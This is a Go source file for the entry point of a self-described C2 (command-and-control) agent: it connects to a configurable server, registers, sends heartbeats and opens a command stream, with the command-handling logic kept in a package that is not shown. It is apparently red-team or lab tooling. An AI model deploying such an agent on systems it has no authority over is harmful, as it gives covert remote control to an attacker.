package main

import (
	"flag"
	"log"
	"os"
	"os/signal"
	"syscall"
	"time"

	"portal/pkg/agent"
)

func main() {
	// Parse command line flags
	serverAddr := flag.String("server", "localhost:50051", "The server address in the format of host:port")
	flag.Parse()

	// Create a new C2 agent
	c2Agent := agent.NewC2Agent(*serverAddr)

	// Set up signal handling for graceful shutdown
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)

	// Connect to the server
	log.Printf("Connecting to C2 server at %s", *serverAddr)
	if err := c2Agent.Connect(); err != nil {
		log.Fatalf("Failed to connect to server: %v", err)
	}

	// Register with the server
	if err := c2Agent.Register(); err != nil {
		log.Fatalf("Failed to register with server: %v", err)
	}

	// Start the heartbeat
	c2Agent.StartHeartbeat(30 * time.Second)

	// Start the command stream
	if err := c2Agent.StartCommandStream(); err != nil {
		log.Fatalf("Failed to start command stream: %v", err)
	}

	log.Println("Agent running. Press Ctrl+C to exit.")

	// Wait for interrupt signal
	<-sigCh
	log.Println("Shutting down...")

	// Gracefully shut down the agent
	c2Agent.Stop()
}